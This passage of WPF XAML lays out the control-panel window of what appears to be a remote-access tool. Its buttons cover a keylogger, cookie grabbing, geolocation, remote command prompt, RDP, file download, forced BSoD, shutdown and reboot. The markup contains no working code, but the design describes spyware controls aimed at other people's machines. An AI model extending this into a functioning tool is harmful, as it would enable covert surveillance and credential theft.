                                    <TextBox x:Name="txtBoxOut" Text ="{Binding Path=SelectedSession.Outgoing}" Foreground="AliceBlue" Height="20" Background="#24282A"  IsReadOnly="True"  HorizontalAlignment="Left" Width="90"/>
                                    <Label x:Name="outSizeUnits" Content="B" Foreground="AliceBlue"  HorizontalAlignment="Center" Margin="0" Grid.Row="2" VerticalAlignment="Center"/>

                                </StackPanel>

                            </StackPanel>
                        </Grid>
                    </GroupBox>
                </Grid>
            </GroupBox>

            <GroupBox x:Name="groupBoxLeft" Grid.Column="0" Header="Features" Margin="5,2,5,0" HorizontalContentAlignment="Center">
                <Grid Margin="5,10" ShowGridLines="False">
                    <Grid.RowDefinitions>
                        <RowDefinition Height="auto"/>
                        <RowDefinition Height="0.2*"/>
                    </Grid.RowDefinitions>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                    </Grid.ColumnDefinitions>
                    <StackPanel x:Name="StackPanelFeatureButtons" Grid.Column="0" Grid.Row="0">
                        <Button x:Name="btnCmdPrompt" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnCmdPrompt_Clicked">
                            <Image Source="app_resources/cmd.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Button>

                        <Button x:Name="btnKeyLoggerWithIcon" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnKeyLogger_Clicked">
                            <Image Source="app_resources/keylogger.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center" ContextMenuClosing="btnKeyLogger_Clicked"/>
                        </Button>

                        <Button x:Name="btnTaskList" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnTaskList_Clicked">
                            <Image Source="app_resources/tasklist.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Button>

                        <Button x:Name="btnDownload" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnDownload_Clicked">
                            <Image Source="app_resources/download.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Button>

                        <Button x:Name="btnRDP" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnRDP_Clicked">
                            <Image Source="app_resources/rdp.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Button>

                        <Button x:Name="btnShutdown" Margin="0,0,0,5" Width="64" Height="64" Background="#24282A" BorderBrush="#00707070" Click="btnShutdown_Clicked">
                            <Image Source="app_resources/shutdown.png" Height="64" Width="64" Stretch="Uniform" HorizontalAlignment="Center" VerticalAlignment="Center"/>

                        </Button>
                    </StackPanel>

                    <StackPanel  x:Name="StackPanelLeftButtons" Grid.Column="0" Grid.Row="1" MinHeight="80" VerticalAlignment="Top" Margin="0,15,0,0">
                        <Button x:Name="btnCookies" Content="Cookies" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnCookies_Clicked"/>
                        <Button x:Name="btnGeo" Content="Gmaps" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnGeo_Clicked"/>
                        <Button x:Name="btnTelnet" Content="Telnet" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnTelnet_Clicked"/>
                        <Button x:Name="btnBsod" Content="BSoD" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnBsod_Clicked"/>
                        <Button x:Name="btnReboot" Content="Reboot" Style="{StaticResource ButtonStyle}" HorizontalContentAlignment="Stretch" VerticalAlignment="Top" Margin="0,5,0,0" Click="btnReboot_Clicked"/>

                    </StackPanel>
                </Grid>
            </GroupBox>
        </Grid>

    </DockPanel>

</Window>
